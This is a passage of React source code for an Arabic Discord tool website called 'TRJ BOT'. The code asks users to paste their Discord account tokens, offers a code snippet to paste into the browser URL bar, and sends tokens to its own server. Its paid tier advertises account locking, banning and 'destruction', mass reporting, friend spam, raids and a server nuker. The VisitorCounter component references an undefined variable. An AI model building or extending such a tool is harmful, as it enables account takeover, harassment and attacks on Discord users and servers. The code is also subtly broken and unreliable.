                  <input type="text" value={tokenInput} onChange={e => { setTokenInput(e.target.value); setTokenValid(null); setAutoPasted(false) }} placeholder="الصق التوكن هنا..." className="flex-1 bg-black/40 border border-green-500/20 rounded-xl px-3 py-2.5 text-xs text-white font-mono placeholder-white/15 focus:outline-none focus:border-green-400/40 transition-colors" autoFocus />
                  {tokenInput.length > 50 ? (
                    <button onClick={handleTokenSubmit} className="px-4 py-2.5 rounded-xl font-bold text-xs cursor-pointer bg-green-500/20 text-green-400 border border-green-500/30 hover:bg-green-500/30 transition-colors active:scale-[0.97]">✅ استخدام</button>
                  ) : (
                    <button onClick={() => { try { navigator.clipboard.readText().then(text => { if (text) { setTokenInput(text); setAutoPasted(true); setTokenValid(text.length > 50 && /^[A-Za-z0-9._-]+$/.test(text)) } }).catch(() => {}) } catch {} }} className="px-3 py-2.5 rounded-xl font-bold text-[10px] cursor-pointer bg-white/5 text-white/40 border border-white/10 hover:bg-white/10 transition-colors">📋 لصق</button>
                  )}
                </div>
                {tokenInput.length > 0 && tokenInput.length <= 50 && (
                  <p className="text-[9px] text-red-400/60 mt-2">❌ التوكن قصير جداً - تأكد أنك نسخته كامل</p>
                )}
                {tokenValid === true && (
                  <p className="text-[9px] text-green-400/80 mt-2">✅ التوكن صالح! اضغط &quot;استخدام&quot;</p>
                )}
              </div>

              {/* الكود للنسخ */}
              <div className="bg-white/3 rounded-xl p-3 border border-white/5 mb-4">
                <div className="flex items-center gap-2 mb-2">
                  <span className="text-[10px] text-white/40">📎 الكود (الصقه في URL):</span>
                  <button onClick={copyUrlCode} className="text-[9px] text-cyan-400 bg-cyan-500/10 px-2 py-0.5 rounded-lg border border-cyan-500/20 hover:bg-cyan-500/20 cursor-pointer transition-colors">
                    {copiedCode ? '✅ تم النسخ' : '📋 نسخ'}
                  </button>
                </div>
                <div className="bg-black/40 rounded-lg p-2 border border-white/5 overflow-x-auto">
                  <code className="text-[7px] text-cyan-300/70 whitespace-nowrap block font-mono">{fullCode}</code>
                </div>
              </div>

              {/* فيديو */}
              <div className="bg-red-500/5 rounded-xl p-3 border border-red-500/15 mb-4">
                <div className="flex items-center gap-2 mb-2">
                  <span className="text-sm">🎥</span>
                  <span className="text-[11px] text-red-400 font-bold">شرح بالفيديو</span>
                </div>
                <a href="https://www.youtube.com/shorts/owx2Y1FagFQ" target="_blank" rel="noopener noreferrer" className="flex items-center justify-center gap-2 py-3 rounded-xl bg-red-500/10 border border-red-500/20 hover:bg-red-500/20 transition-colors cursor-pointer">
                  <span className="text-lg">▶️</span>
                  <span className="text-xs text-red-300 font-bold">مشاهدة الشرح على يوتيوب</span>
                </a>
              </div>

              {/* Bottom buttons */}
              <div className="flex gap-2">
                <button onClick={startExtract} className="flex-1 py-2.5 rounded-xl font-bold text-[11px] transition-all cursor-pointer border active:scale-[0.97] bg-white/5 text-white/40 border-white/10 hover:bg-white/10">
                  📋 نسخ الكود مرة ثانية
                </button>
                <button onClick={() => setPhase('main')} className="flex-1 py-2.5 rounded-xl font-bold text-[11px] transition-all cursor-pointer border active:scale-[0.97] bg-white/5 text-white/40 border-white/10 hover:bg-white/10">
                  🔙 رجوع
                </button>
              </div>
            </>
          )}
        </div>
      </div>
    </div>
  )
}

function ProfileModal({ show, onClose }: { show: boolean; onClose: () => void }) {
  if (!show) return null

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center p-4" onClick={onClose}>
      {/* Animated background overlay */}
      <div className="absolute inset-0 bg-black/85 backdrop-blur-md" />

      {/* Floating particles */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-1/4 left-1/4 w-2 h-2 bg-green-400/30 rounded-full animate-ping" style={{ animationDuration: '3s' }} />
        <div className="absolute top-1/3 right-1/3 w-1.5 h-1.5 bg-emerald-400/20 rounded-full animate-ping" style={{ animationDuration: '4s' }} />
        <div className="absolute bottom-1/4 left-1/3 w-1 h-1 bg-green-300/25 rounded-full animate-ping" style={{ animationDuration: '5s' }} />
        <div className="absolute top-1/2 right-1/4 w-1.5 h-1.5 bg-purple-400/20 rounded-full animate-ping" style={{ animationDuration: '3.5s' }} />
      </div>

      {/* Profile Card */}
      <div
        className="relative w-full max-w-sm sm:max-w-md animate-slide-up"
        onClick={e => e.stopPropagation()}
      >
        {/* Outer glow */}
        <div className="absolute -inset-1 bg-gradient-to-r from-green-500/20 via-emerald-500/20 to-green-500/20 rounded-3xl blur-xl" />
        <div className="absolute -inset-0.5 bg-gradient-to-r from-green-500/10 via-emerald-500/10 to-green-500/10 rounded-3xl blur-md" />

        <div className="relative bg-[#111827] border border-green-500/20 rounded-3xl shadow-2xl shadow-green-500/10 overflow-hidden">
          {/* Banner */}
          <div className="relative h-32 sm:h-36 bg-gradient-to-br from-black via-gray-900 to-black overflow-hidden">
            <div className="absolute inset-0 bg-[url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA0MCA0MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48ZyBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPjxnIGZpbGw9IiNmZmZmZmYiIGZpbGwtb3BhY2l0eT0iMC4wMyI+PHBhdGggZD0iTTAgMGg0MHY0MEgweiIvPjwvZz48L2c+PC9zdmc+')] opacity-40" />
            <div className="absolute inset-0 bg-gradient-to-b from-transparent via-transparent to-black/20" />

            {/* Close button */}
            <button onClick={onClose} className="absolute top-3 right-3 w-8 h-8 rounded-full bg-black/40 backdrop-blur-sm flex items-center justify-center text-white/60 hover:text-white hover:bg-black/60 cursor-pointer transition-all text-sm border border-white/10">
              ✕
            </button>
          </div>

          {/* Avatar */}
          <div className="relative px-6 -mt-14">
            <div className="relative inline-block">
              {/* Avatar glow ring */}
              <div className="absolute -inset-1 bg-gradient-to-r from-green-400 to-emerald-400 rounded-full opacity-60 blur-sm" />
              <div className="relative w-24 h-24 rounded-full overflow-hidden border-4 border-[#111827] shadow-xl">
                <img src="/profile.png" alt="TRJ" className="w-full h-full object-cover" />
              </div>
              {/* Online indicator */}
              <div className="absolute bottom-1 right-1 w-5 h-5 bg-green-500 rounded-full border-[3px] border-[#111827] flex items-center justify-center">
                <div className="w-2 h-2 bg-green-300 rounded-full" />
              </div>
            </div>
          </div>

          {/* User Info */}
          <div className="px-6 pt-3 pb-5">
            <div className="flex items-center gap-2 mb-1">
              <h2 className="text-xl font-black text-white">trj.py</h2>
              <span className="text-[9px] font-bold text-green-400 bg-green-500/15 px-2 py-0.5 rounded-full border border-green-500/30 tracking-wider">DEVELOPER</span>
            </div>

            <div className="text-sm text-white/40 mb-4 font-mono">trj.py</div>

            {/* Custom Status */}
            <div className="bg-white/5 rounded-xl px-3 py-2 border border-white/5 mb-5 flex items-center gap-2">
              <div className="w-2.5 h-2.5 bg-green-400 rounded-full animate-pulse" />
              <span className="text-xs text-white/50">Building TRJ BOT v4.3 ⚡ 34 ميزة</span>
            </div>

            {/* Stats */}
            <div className="grid grid-cols-3 gap-2 mb-5">
              <div className="bg-green-500/8 rounded-xl p-2.5 border border-green-500/15 text-center">
                <div className="text-lg mb-0.5">⚡</div>
                <div className="text-sm font-black text-white">35</div>
                <div className="text-[9px] text-white/40">Features</div>
              </div>
              <div className="bg-emerald-500/8 rounded-xl p-2.5 border border-emerald-500/15 text-center">
                <div className="text-lg mb-0.5">✅</div>
                <div className="text-sm font-black text-white">100%</div>
                <div className="text-[9px] text-white/40">Working</div>
              </div>
              <div className="bg-cyan-500/8 rounded-xl p-2.5 border border-cyan-500/15 text-center">
                <div className="text-lg mb-0.5">🌐</div>
                <div className="text-sm font-black text-white">24/7</div>
                <div className="text-[9px] text-white/40">Online</div>
              </div>
            </div>

            {/* Separator */}
            <div className="border-t border-white/5 mb-5" />

            {/* Badges */}
            <div className="flex flex-wrap gap-1.5 mb-5">
              <span className="text-[10px] font-bold text-yellow-400 bg-yellow-500/10 px-2.5 py-1 rounded-full border border-yellow-500/20">👑 Developer</span>
              <span className="text-[10px] font-bold text-green-400 bg-green-500/10 px-2.5 py-1 rounded-full border border-green-500/20">🛡️ Creator</span>
              <span className="text-[10px] font-bold text-emerald-400 bg-emerald-500/10 px-2.5 py-1 rounded-full border border-emerald-500/20">⚡ Pro</span>
              <span className="text-[10px] font-bold text-purple-400 bg-purple-500/10 px-2.5 py-1 rounded-full border border-purple-500/20">💎 Premium</span>
            </div>

            {/* Separator */}
            <div className="border-t border-white/5 mb-5" />

            {/* About */}
            <div className="mb-5">
              <h3 className="text-[10px] text-white/30 uppercase tracking-wider font-bold mb-2">About Me</h3>
              <p className="text-xs text-white/50 leading-relaxed">
                مطور TRJ BOT - أقوى موقع ديسكورد عربية
                <br />
                <span className="text-white/30">Developer of the most powerful Arabic Discord tool</span>
              </p>
            </div>

            {/* Discord tag */}
            <div className="flex items-center justify-center">
              <div className="bg-[#5865F2]/10 border border-[#5865F2]/20 rounded-full px-4 py-2 flex items-center gap-2">
                <svg className="w-4 h-4 text-[#5865F2]" viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.37a19.791 19.791 0 00-4.885-1.515.074.074 0 00-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 00-5.487 0 12.64 12.64 0 00-.617-1.25.077.077 0 00-.079-.037A19.736 19.736 0 003.677 4.37a.07.07 0 00-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 00.031.057 19.9 19.9 0 005.993 3.03.078.078 0 00.084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 00-.041-.106 13.107 13.107 0 01-1.872-.892.077.077 0 01-.008-.128 10.2 10.2 0 00.372-.292.074.074 0 01.077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 01.078.01c.12.098.246.198.373.292a.077.077 0 01-.006.127 12.299 12.299 0 01-1.873.892.077.077 0 00-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 00.084.028 19.839 19.839 0 006.002-3.03.077.077 0 00.032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 00-.031-.03z" /></svg>
                <span className="text-xs font-bold text-[#5865F2]">trj.py</span>
              </div>
            </div>

            {/* Social Links */}
            <div className="mt-4 space-y-2">
              <a href="https://www.youtube.com/@Trojan1888" target="_blank" rel="noopener noreferrer" className="flex items-center justify-center gap-2 w-full bg-red-500/10 border border-red-500/20 rounded-xl px-4 py-2.5 hover:bg-red-500/20 transition-colors">
                <svg className="w-4 h-4 text-red-400" viewBox="0 0 24 24" fill="currentColor"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z" /></svg>
                <span className="text-xs font-bold text-red-400">قناة يوتوب</span>
              </a>
              <a href="https://discord.gg/aWS4P43P3f" target="_blank" rel="noopener noreferrer" className="flex items-center justify-center gap-2 w-full bg-[#5865F2]/10 border border-[#5865F2]/20 rounded-xl px-4 py-2.5 hover:bg-[#5865F2]/20 transition-colors">
                <svg className="w-4 h-4 text-[#5865F2]" viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.37a19.791 19.791 0 00-4.885-1.515.074.074 0 00-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 00-5.487 0 12.64 12.64 0 00-.617-1.25.077.077 0 00-.079-.037A19.736 19.736 0 003.677 4.37a.07.07 0 00-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 00.031.057 19.9 19.9 0 005.993 3.03.078.078 0 00.084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 00-.041-.106 13.107 13.107 0 01-1.872-.892.077.077 0 01-.008-.128 10.2 10.2 0 00.372-.292.074.074 0 01.077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 01.078.01c.12.098.246.198.373.292a.077.077 0 01-.006.127 12.299 12.299 0 01-1.873.892.077.077 0 00-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 00.084.028 19.839 19.839 0 006.002-3.03.077.077 0 00.032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 00-.031-.03z" /></svg>
                <span className="text-xs font-bold text-[#5865F2]">سيرفر ديسكورد</span>
              </a>
            </div>
          </div>
        </div>
      </div>

    </div>
  )
}

/* ==================== PRIME MODAL ==================== */
function PrimeModal({ show, onClose, isPrime, onActivate }: { show: boolean; onClose: () => void; isPrime: boolean; onActivate: (userId?: string, username?: string) => void }) {
  const [step, setStep] = useState<'info' | 'activate'>('info')
  const [token, setToken] = useState('')
  const [code, setCode] = useState('')
  const [loading, setLoading] = useState(false)
  const [msg, setMsg] = useState('')

  useEffect(() => {
    if (show) { setStep('info'); setToken(''); setCode(''); setMsg(''); setLoading(false) }
  }, [show])

  if (!show) return null

  const handleActivate = async () => {
    if (!token || token.length < 50) { setMsg('❌ أدخل توكن صالح'); return }
    if (!code.trim()) { setMsg('❌ أدخل كود التفعيل'); return }
    setLoading(true); setMsg('⏳ جاري التحقق والتفعيل...')
    try {
      const res = await fetch('/api/prime', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ action: 'key', token, key: code.trim() }) })
      const data = await res.json()
      if (data.success) {
        setMsg('✅ تم تفعيل Prime بنجاح! 🎉')
        if (data.userId) {
          onActivate(data.userId, data.username)
          try { localStorage.setItem('trj_prime_user_id', data.userId); localStorage.setItem('trj_prime_username', data.username || '') } catch {}
        }
        setTimeout(() => { onClose() }, 3000)
      } else {
        setMsg('❌ ' + (data.error || 'كود التفعيل غير صحيح'))
      }
    } catch { setMsg('❌ خطأ في الاتصال - حاول مرة أخرى') }
    setLoading(false)
  }

  return (
    <div className="prime-modal-bg" onClick={onClose}>
      <div className="prime-modal animate-slide-up max-h-[90vh] overflow-y-auto" onClick={e => e.stopPropagation()}>
        <div className="p-5 sm:p-6">
          {/* Header */}
          <div className="flex items-center justify-between mb-5">
            <div className="flex items-center gap-3">
              <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-yellow-500/20 to-amber-600/10 border border-yellow-500/25 flex items-center justify-center text-2xl">⭐</div>
              <div>
                <h3 className="font-black text-yellow-400 text-lg">TRJ Prime</h3>
                <p className="text-[10px] text-white/30">اشتراك متميز - ميزات حصرية</p>
              </div>
            </div>
            <button onClick={onClose} className="w-8 h-8 rounded-full bg-white/5 flex items-center justify-center text-white/40 hover:text-white/80 hover:bg-white/10 cursor-pointer transition-colors text-sm">✕</button>
          </div>

          {/* Active Badge */}
          {isPrime && (
            <div className="bg-gradient-to-r from-yellow-500/10 to-amber-500/5 border border-yellow-500/20 rounded-2xl p-4 mb-5 text-center animate-fade-in">
              <div className="text-3xl mb-2">👑</div>
              <h4 className="font-black text-yellow-400 text-sm">Prime مفعّل</h4>
              <p className="text-[10px] text-white/40 mt-1">لديك صلاحية جميع الميزات الحصرية</p>
            </div>
          )}

          {/* Features List */}
          <div className="space-y-2 mb-5">
            <h4 className="text-xs font-bold text-white/60 mb-3">🎯 الميزات الحصرية ({isPrime ? '14' : '14'} ميزة):</h4>
            <div className="grid grid-cols-2 gap-2">
              {[
                { icon: '🎰', name: 'توليد توكنات ذكي' },
                { icon: '🔒', name: 'قفل حساب' },
                { icon: '🚫', name: 'تبنيد حساب' },
                { icon: '💀', name: 'تدمير حساب' },
                { icon: '🚨', name: 'بلاغات جماعية' },
                { icon: '👥', name: 'سبام صداقات' },
                { icon: '🔗', name: 'كاشف ويب هوك' },
                { icon: '🧲', name: 'مستخرج بيانات' },
                { icon: '🌐', name: 'ويب هوك خارق' },
                { icon: '⚡', name: 'نيوكر سريع' },
                { icon: '🔥', name: 'Raid Mode' },

                { icon: '🛡️', name: 'حماية سيرفر' },
                { icon: '📱', name: 'إشعارات 2FA' },
              ].map((f, i) => (
                <div key={i} className="flex items-center gap-2 bg-white/3 rounded-lg px-2.5 py-2 border border-white/5">
                  <span className="text-sm">{f.icon}</span>
                  <span className="text-[10px] text-white/70">{f.name}</span>
                </div>
              ))}
            </div>
          </div>

          {/* Price */}
          <div className="bg-gradient-to-r from-yellow-500/8 to-amber-500/5 border border-yellow-500/15 rounded-2xl p-4 mb-5 text-center">
            <div className="text-[10px] text-white/40 mb-1">السعر</div>
            <div className="text-2xl font-black text-yellow-400">2,000,000</div>
            <div className="text-[10px] text-yellow-400/50">كرديت ديسكورد</div>
          </div>

          {/* Steps / Activate */}
          {!isPrime && (
            <>
              {step === 'info' ? (
                <>
                  <div className="bg-blue-500/5 rounded-xl p-4 border border-blue-500/10 mb-5 space-y-3">
                    <h4 className="text-sm font-bold text-blue-400 text-center mb-3">📋 خطوات التفعيل:</h4>
                    <div className="space-y-2.5">
                      <div className="flex items-start gap-3 bg-black/20 rounded-lg p-3 border border-white/5">
                        <div className="w-7 h-7 rounded-full bg-blue-500/15 border border-blue-500/25 flex items-center justify-center text-xs font-black text-blue-400 flex-shrink-0">1</div>
                        <div>
                          <p className="text-[11px] text-white/80 font-bold">ادخل سيرفر TRJ</p>
                          <a href="https://discord.com/invite/aWS4P43P3f" target="_blank" rel="noopener noreferrer" className="text-[10px] text-cyan-400 underline mt-0.5 block">discord.com/invite/aWS4P43P3f</a>
                        </div>
                      </div>
                      <div className="flex items-start gap-3 bg-black/20 rounded-lg p-3 border border-white/5">
                        <div className="w-7 h-7 rounded-full bg-blue-500/15 border border-blue-500/25 flex items-center justify-center text-xs font-black text-blue-400 flex-shrink-0">2</div>
                        <div>
                          <p className="text-[11px] text-white/80 font-bold">تواصل مع صاحب البوت (Trojan .#1888)</p>
                          <p className="text-[10px] text-white/40 mt-0.5">اطلب كود تفعيل Prime واعطائه 2M كرديت</p>
                        </div>
                      </div>
                      <div className="flex items-start gap-3 bg-black/20 rounded-lg p-3 border border-white/5">
                        <div className="w-7 h-7 rounded-full bg-blue-500/15 border border-blue-500/25 flex items-center justify-center text-xs font-black text-blue-400 flex-shrink-0">3</div>
                        <div>
                          <p className="text-[11px] text-white/80 font-bold">عند الحصول على الكود</p>
                          <p className="text-[10px] text-white/40 mt-0.5">اضغط الزر بالأسفل وأدخل توكنك + الكود</p>
                        </div>
                      </div>
                    </div>
                    <p className="text-[9px] text-white/25 text-center mt-2">⚠️ تأكد أن لديك 2,000,000 كرديت قبل التواصل</p>
                  </div>

                  <button onClick={() => setStep('activate')} className="w-full py-3.5 rounded-xl font-black text-sm transition-all cursor-pointer border bg-gradient-to-r from-yellow-500/20 to-amber-500/15 text-yellow-400 border-yellow-500/30 hover:from-yellow-500/30 hover:to-amber-500/25 active:scale-[0.98]">
                    🔑 لدي كود - تفعيل الآن
                  </button>
                </>
              ) : (
                <>
                  <button onClick={() => setStep('info')} className="flex items-center gap-2 text-slate-400 hover:text-white/60 text-xs mb-4 cursor-pointer transition-colors">
                    <span>→</span><span>رجوع للخطوات</span>
                  </button>

                  <div className="mb-3">
                    <label className="text-[11px] text-white/50 mb-1 block">🎫 توكن حسابك</label>
                    <input type="password" value={token} onChange={e => setToken(e.target.value)} placeholder="ألصق توكنك هنا..." className="w-full bg-black/30 border border-yellow-500/20 rounded-xl px-4 py-3 text-white text-sm placeholder-white/20 focus:outline-none focus:border-yellow-400/40 transition-colors" />
                  </div>

                  <div className="mb-4">
                    <label className="text-[11px] text-emerald-300/70 mb-1 block">🔑 كود التفعيل</label>
                    <input type="text" value={code} onChange={e => setCode(e.target.value)} placeholder="أدخل الكود الذي حصلت عليه من صاحب البوت..." className="w-full bg-black/30 border border-emerald-500/20 rounded-xl px-4 py-3 text-white text-sm placeholder-white/20 focus:outline-none focus:border-emerald-400/40 transition-colors font-mono" />
                    <p className="text-[9px] text-white/25 mt-1.5">الكود تحصل عليه من Trojan .#1888 في السيرفر</p>
                  </div>

                  <button onClick={handleActivate} disabled={loading} className={`w-full py-3.5 rounded-xl font-black text-sm transition-all cursor-pointer border ${loading ? 'opacity-50 cursor-not-allowed bg-yellow-500/10 text-yellow-500/50 border-yellow-500/20' : 'bg-gradient-to-r from-emerald-500/20 to-green-500/15 text-emerald-400 border-emerald-500/30 hover:from-emerald-500/30 hover:to-green-500/25 active:scale-[0.98]'}`}>
                    {loading ? '⏳ جاري التحقق...' : '✅ تفعيل Prime'}
                  </button>
                </>
              )}

              {msg && (
                <div className={`mt-3 p-3 rounded-xl text-xs font-medium border text-center animate-fade-in ${msg.startsWith('✅') ? 'bg-green-500/10 text-green-400 border-green-500/20' : 'bg-red-500/10 text-red-400 border-red-500/20'}`}>
                  {msg}
                </div>
              )}
            </>
          )}

          {/* Footer */}
          <div className="mt-4 pt-3 border-t border-white/5 text-center">
            <p className="text-[9px] text-white/20">جميع حقوق محفوظه لدى Trojan .#1888</p>
          </div>
        </div>
      </div>
    </div>
  )
}

/* ==================== FEEDBACK MODAL ==================== */
function FeedbackModal({ show, onClose, type, isPrime, userId, username }: { show: boolean; onClose: () => void; type: 'suggestion' | 'problem'; isPrime: boolean; userId: string; username: string }) {
  const [message, setMessage] = useState('')
  const [loading, setLoading] = useState(false)
  const [msg, setMsg] = useState('')

  useEffect(() => {
    if (show) { setMessage(''); setMsg(''); setLoading(false) }
  }, [show])

  if (!show) return null

  const handleSubmit = async () => {
    if (!message.trim() || message.trim().length < 5) { setMsg('❌ الرسالة قصيرة جداً'); return }
    if (message.length > 2000) { setMsg('❌ الرسالة طويلة جداً'); return }
    setLoading(true); setMsg('')
    try {
      const res = await fetch('/api/feedback', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type, message: message.trim(), userId, username, isPrime })
      })
      const data = await res.json()
      if (data.success) {
        setMsg(data.message)
        setTimeout(() => { onClose() }, 2500)
      } else {
        setMsg('❌ ' + (data.error || 'فشل الإرسال'))
      }
    } catch { setMsg('❌ خطأ في الاتصال') }
    setLoading(false)
  }

  const isSuggestion = type === 'suggestion'

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center p-4" onClick={onClose}>
      <div className="absolute inset-0 bg-black/80 backdrop-blur-sm" />
      <div className="relative bg-[#0a0e14] border border-slate-700/50 rounded-2xl w-full max-w-md shadow-2xl animate-slide-up" onClick={e => e.stopPropagation()}>
        <div className="p-5">
          {/* Header */}
          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center gap-3">
              <div className={`w-10 h-10 rounded-xl flex items-center justify-center text-xl ${isSuggestion ? 'bg-blue-500/15 border border-blue-500/25' : 'bg-red-500/15 border border-red-500/25'}`}>
                {isSuggestion ? '💡' : '⚠️'}
              </div>
              <div>
                <h3 className={`font-black text-sm ${isSuggestion ? 'text-blue-400' : 'text-red-400'}`}>
                  {isSuggestion ? 'اقتراحك' : 'مشكلتك'}
                </h3>
                <p className="text-[10px] text-white/30">نسعد بسماع رأيك</p>
              </div>
            </div>
            <button onClick={onClose} className="w-7 h-7 rounded-full bg-white/5 flex items-center justify-center text-white/40 hover:text-white/80 cursor-pointer transition-colors text-sm">✕</button>
          </div>

          {/* Prime Notice */}
          {isPrime && (
            <div className="bg-yellow-500/8 border border-yellow-500/15 rounded-xl p-3 mb-4 flex items-center gap-2">
              <span className="text-lg">⭐</span>
              <p className="text-[11px] text-yellow-400/80">بما أنك <b>Prime</b>، سيتم تنفيذ طلبك بشكل فوري!</p>
            </div>
          )}

          {/* Message Input */}
          <div className="mb-4">
            <label className="text-[11px] text-white/50 mb-1 block">
              {isSuggestion ? '💡 اكتب اقتراحك هنا...' : '⚠️ صف مشكلتك بالتفصيل...'}
            </label>
            <textarea
              value={message}
              onChange={e => setMessage(e.target.value)}
              placeholder={isSuggestion ? 'اقتراحك لتحسين الموقع أو إضافة ميزة جديدة...' : 'صف المشكلة التي واجهتها...'}
              rows={4}
              className="w-full bg-black/30 border border-slate-700/50 rounded-xl px-4 py-3 text-white text-sm placeholder-white/20 resize-none focus:outline-none focus:border-slate-600/50 transition-colors"
            />
            <p className="text-[10px] text-white/30 mt-1">{message.length}/2000</p>
          </div>

          {/* Submit Button */}
          <button
            onClick={handleSubmit}
            disabled={loading || !message.trim()}
            className={`w-full py-3 rounded-xl font-bold text-sm transition-all cursor-pointer border disabled:opacity-50 disabled:cursor-not-allowed ${isSuggestion ? 'bg-blue-500/15 text-blue-400 border-blue-500/30 hover:bg-blue-500/25' : 'bg-red-500/15 text-red-400 border-red-500/30 hover:bg-red-500/25'} active:scale-[0.98]`}
          >
            {loading ? '⏳ جاري الإرسال...' : isSuggestion ? '💡 إرسال الاقتراح' : '⚠️ إرسال المشكلة'}
          </button>

          {/* Message */}
          {msg && (
            <div className={`mt-3 p-3 rounded-xl text-xs font-medium border text-center animate-fade-in ${msg.startsWith('✅') ? 'bg-green-500/10 text-green-400 border-green-500/20' : 'bg-red-500/10 text-red-400 border-red-500/20'}`}>
              {msg}
            </div>
          )}

          {/* Help Link */}
          <div className="mt-4 pt-3 border-t border-white/5 text-center">
            <p className="text-[10px] text-white/30">
              واجهت مشكلة؟{' '}
              <a href="https://discord.com/invite/aWS4P43P3f" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                افتح تكت في السيرفر
              </a>
            </p>
          </div>
        </div>
      </div>
    </div>
  )
}

function VisitorCounter() {
  const [visitorTotal, setVisitorTotal] = useState(0)

  useEffect(() => {
    const fetchCount = () => {
      fetch('/api/visitor-count').then(r => r.json()).then(d => {
        if (d.success) setVisitorTotal(d.total)
      }).catch(() => {})
    }
    fetchCount()
    const refresh = setInterval(fetchCount, 60000)
    return () => { clearInterval(refresh) }
  }, [])

  if (!mounted) return null

  return (
    <div className="fixed bottom-20 right-3 sm:bottom-4 sm:right-4 z-[90]">
      <div className="bg-black/50 backdrop-blur-xl border border-white/[0.1] rounded-2xl px-3 py-2 flex items-center gap-2 shadow-xl shadow-black/30 hover:bg-black/60 transition-all cursor-default">
        <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse"></div>
        <span className="text-[11px] font-bold text-white/80">👁 {visitorTotal.toLocaleString()} زيارة</span>
      </div>
    </div>
  )
}

